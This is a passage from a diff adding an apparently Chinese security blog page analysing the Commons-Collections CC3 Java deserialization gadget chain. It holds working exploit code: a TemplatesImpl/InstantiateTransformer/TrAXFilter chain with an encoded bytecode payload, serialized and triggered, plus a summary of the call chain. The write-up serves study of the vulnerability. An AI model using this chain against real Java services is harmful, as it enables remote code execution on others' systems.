class="hljs-string">"bgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAARAAQAEgANABMACwAAAAQAAQAQAAEAEQAAAAIAEg=="</span><br>    );<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">calcTemp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(calcTemp, <span class="hljs-string">"_bytecodes"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] {CalcCode});<br>    setFieldValue(calcTemp, <span class="hljs-string">"_name"</span>, <span class="hljs-string">"CalcTemplatesImpl"</span>);<br>    setFieldValue(calcTemp, <span class="hljs-string">"_tfactory"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Templates.class}, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{calcTemp})<br>    };<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><span class="hljs-comment">//        CC6前半段,高版本jdk利用</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(),transformerChain);<br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">"key"</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tiedMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    tiedMap.put(tiedMapEntry,<span class="hljs-string">"Exp"</span>);<br>    <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>    hashSet.add(tiedMap);<br>    lazyMap.remove(<span class="hljs-string">"key"</span>);<br><br>    <span class="hljs-comment">// 测试</span><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>    oos.writeObject(hashSet);<br>    oos.close();<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>    ois.readObject();<br>}<br></code></pre></td></tr></table></figure>
+
+<p>最后捋一捋：</p>
+<p>使用的是动态加载类的思想，关键在于如何触发<code>TrAXFilter</code>的构造函数，于是发现了新的带有<code>transform</code>的<code>InstantiateTransformer</code>类</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs leaf">CC6前半段<br>-&gt;InstantiateTransformer<span class="hljs-punctuation">#</span><span class="hljs-keyword">transform</span><span class="hljs-params">()</span><br>-&gt;TrAXFilter<span class="hljs-punctuation">#</span><span class="hljs-keyword">TrAXFilter</span><span class="hljs-params">()</span><br>-&gt;TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">TemplatesImpl</span><span class="hljs-params">()</span><br>-&gt;TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">newTransformer</span><span class="hljs-params">()</span> <br>-&gt; TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">getTransletInstance</span><span class="hljs-params">()</span> <br>-&gt; TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineTransletClasses</span><span class="hljs-params">()</span><br>-&gt; TransletClassLoader<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineClass</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929210939550.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929210939550">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CC3链分析</div>
+      <div>https://3xsh0re.github.io/2024/09/29/CC3链分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>3xsh0re</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/" title="记一次从FastAdmin到GetShell">
+                        <span class="hidden-mobile">记一次从FastAdmin到GetShell</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"3xsh0re/Blog_Comment","repo-id":"R_kgDOMZnVkQ","category":"Announcements","category-id":"DIC_kwDOMZnVkc4ChFCz","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"bottom","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>博客由Hexo驱动~</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
